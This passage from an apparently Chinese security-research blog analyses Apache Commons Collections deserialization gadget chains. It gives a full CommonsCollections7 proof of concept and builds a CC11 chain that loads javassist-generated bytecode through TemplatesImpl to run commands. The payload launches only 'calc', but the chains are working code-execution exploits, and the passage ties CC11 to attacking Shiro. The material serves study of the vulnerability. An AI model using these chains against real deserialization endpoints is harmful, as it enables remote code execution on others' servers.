class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap,<span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2,<span class="number">2</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Fake-Transformer"><a href="#Fake-Transformer" class="headerlink" title="Fake Transformer"></a>Fake Transformer</h4><p>和cc6差不多，我们在执行**hashtable.put()**时，同样会触发利用链</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206205356150.png" alt="image-20211206205356150"></p>
<p>那么我们只需要先传入一个<strong>fakeTransformer</strong>，最后再改回来就好了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">        <span class="comment">//获取getRuntime方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);<span class="comment">//这里我们传入假的transformer，实际为空</span></span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap,<span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">objectOutputStream.writeObject(hashtable);<span class="comment">//序列化</span></span><br><span class="line">objectOutputStream.flush();</span><br><span class="line">objectOutputStream.close();</span><br><span class="line">fileOutputStream.close();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>原本以为这样就结束了，结果计算器又不跳出来了。还记得<strong>cc6</strong>吗，我们出现的问题和这个一模一样</p>
<h4 id="FakeTransformer引发的LazyMap问题"><a href="#FakeTransformer引发的LazyMap问题" class="headerlink" title="FakeTransformer引发的LazyMap问题"></a>FakeTransformer引发的LazyMap问题</h4><p>在<code>LazyMap.get()</code>中，<code>factory</code>为我们传入的空的<code>Transformer</code>，key值为<code>yy</code>，同时key值被放入<code>hashtable</code>.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);<span class="comment">//这里key值为yy</span></span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);<span class="comment">//yy被放进hashtable</span></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如下图：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206210624980.png" alt="image-20211206210624980"></p>
<p>我们在<code>AbstractMap.equals()</code>方法中有一个if判断，此处的**size()**为1，<code>m.size()</code>为2 -》 因为<code>yy</code>被加进了<code>hashtable</code>，所以会直接返回false，从而不会触发利用链。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206210904041.png" alt="image-20211206210904041"></p>
<p>因此我们需要把<code>yy</code>从<code>lazyMap</code>中移除。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="POC构造-2"><a href="#POC构造-2" class="headerlink" title="POC构造"></a>POC构造</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, IOException &#123;</span><br><span class="line">        <span class="comment">//lazymap.get()-&gt;factory[constructor].transform()</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);<span class="comment">//这里我们传入假的transformer，实际为空</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer,transformers);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashtable);<span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Reference-5"><a href="#Reference-5" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#Poc-4">Commons-Collections 1-7 分析</a></p>
<h2 id="Commons-Collections-11"><a href="#Commons-Collections-11" class="headerlink" title="Commons Collections 11"></a>Commons Collections 11</h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h3><p>学完cc1-7好久，研究shiro550的时候发现要用到cc11，因为一些原因cc6不能用。</p>
<p>因此在这里会对cc11进行详细讲解，同时也是对之前的cc链的复习。</p>
<p>cc11是cc1、cc2、cc5、cc6的结合，用到了InvokerTransformer、javassist字节码编写、TemplateImpl字节码执行、TiedMapEntry、HashMap等</p>
<h3 id="环境搭建-7"><a href="#环境搭建-7" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这次我是直接使用maven创建的项目，就不用自己来导包了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>CommonsCollections11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.19.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="恶意class字节码编写"><a href="#恶意class字节码编写" class="headerlink" title="恶意class字节码编写"></a>恶意class字节码编写</h4><p>每个ctClass代表我们要修改的class，因此我们在classPool中创建一个名叫Evil的CtClass</p>
<p>通过静态代码块，插入执行代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//</span></span><br><span class="line">cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//</span></span><br><span class="line"><span class="type">byte</span>[] evilbytes = cc.toBytecode();<span class="comment">//恶意字节码</span></span><br></pre></td></tr></table></figure>

<h4 id="TemplatesImpl加载恶意class"><a href="#TemplatesImpl加载恶意class" class="headerlink" title="TemplatesImpl加载恶意class"></a>TemplatesImpl加载恶意class</h4><p>在TemplateImpl中查找<code>defineClass</code>关键字，因为我们知道ClassLoader就是通过方法**defineClass()**来加载字节码的。</p>
<p>通过以下图可知，我们可以传入一个<code>_tfactory</code>的值(new一个它Class的新对象就可以)和<code>_bytecodes</code>（恶意字节码），然后再让获取到的loader来call它的defineClass()，从而将我们的字节码加载进jvm</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102151143793.png" alt="image-20220102151143793"></p>
<p>上面的流程是在defineTransletClasses()里的，接下来我们要找到什么地方调用了defineTransletClasses()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102151651096.png" alt="image-20220102151651096"></p>
<p>发现**getTransletInstance()<strong>调用了</strong>defineTranslateClasses()**，同时如果我们要使用该方法，需要让<code>_name</code>不为空，<code>_class</code>为空</p>
<p><strong>newTransformer()<strong>调用了</strong>getTransletInstance()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102152313976.png" alt="image-20220102152313976"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102152422839.png" alt="image-20220102152422839"></p>
<p><strong>getOutputProperties()<strong>调用了</strong>newTransformer()</strong></p>
<p>因此TemplateImpl执行顺序如下</p>
<blockquote>
<p>getOutputProperties-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTranslateClasses()-&gt;defineClass()</p>
</blockquote>
<p>那么其实只要找到调用TemplatesImpl#getOutputProperties或者TemplatesImpl#newTransformer()的地方就可以连接上了。</p>
<p>我们先编写一些TemplatesImpl的部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">      <span class="comment">/*配置TemplatesImpl - 加载恶意class到jvm*/</span></span><br><span class="line">      <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">      <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">      bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      bytecodes.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilbytes&#125;);<span class="comment">//这里传入的evilbytes需要在byte[][]中</span></span><br><span class="line">      <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">      name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      name.set(templates,<span class="string">&quot;LeiHello&quot;</span>);</span><br><span class="line">      <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">      tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//任意方法调用templates.newTransformer()或者templates.getOutputProperties即可触发</span></span><br></pre></td></tr></table></figure>

<h4 id="InvokerTransformer-1"><a href="#InvokerTransformer-1" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>已知TemplatesImpl#getOutputProperties或者TemplatesImpl#newTransformer()任意一个方法被调用都可以触发。这里我们以<code>newTrasnformer()</code>为例</p>
<p>看一下调用的情况:</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102154928181.png" alt="image-20220102154928181"></p>
<p>在之前的cc3中已经分析过了<code>TrAXFilter()</code>的调用，在cc11里我们不再使用该链。</p>
<p>还记得InvokerTransformer吗，它是在commons-collections 3.1版本中存在的最为经常被使用的一个类。我们可以使用该类call任意方法。</p>
<p>再来回顾一下<strong>InvokerTransformer#transform</strong>方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102155548083.png" alt="image-20220102155548083"></p>
<p>因此我们可以这样写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>在之前对cc链的分析中，后续的利用导致在生成payload阶段就触发了执行，因此我们在这里应该先随意写一个method作为占位，之后再进行修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>接下来寻找调用invokerTransformer#transform的方法，同时能够传入input=<code>templates</code>(我们的恶意class)</p>
<h4 id="LazyMap-2"><a href="#LazyMap-2" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>这里不再像之前的cc链一样使用ChainedTransformer，相反我们使用LazyMap来继续完成这个链。LazyMap有一个get()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);<span class="comment">//这里执行了transform方法</span></span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果this.factory为invokerTransformer，则当LazyMap#get被调用的时候，命令可以执行。</p>
<p>所以需要构造LazyMap</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102162535035.png" alt="image-20220102162535035"></p>
<p>可以直接通过decorate方法来构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, invokerTransformer);</span><br></pre></td></tr></table></figure>

<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>现在需要找到一个Class能够调用LazyMap#get()方法，我们找到了<strong>TiedMapEntry</strong></p>
<p>在TiedMapEntry#get()处调用了getValue()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时hashCode方法调用了getValue()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这样写：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templates);</span><br></pre></td></tr></table></figure>



<h4 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h4><p>为了调用TiedMapEntry#hashCode方法，可以利用HashMap的反序列化操作。</p>
<p>在HashMap中，它有自己的<strong>readObject()方法</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102165724308.png" alt="image-20220102165724308"></p>
<p>首先会反序列化HashMap中的key和value</p>
<p>在最后一行，调用了hash(key)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hash方法中调用了key.hashCode()</p>
<p>因此，如果我们将之前的tiedMapEntry放入hashMap的key中，就能触发整个利用链了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;helloWorld&quot;</span>);</span><br></pre></td></tr></table></figure>

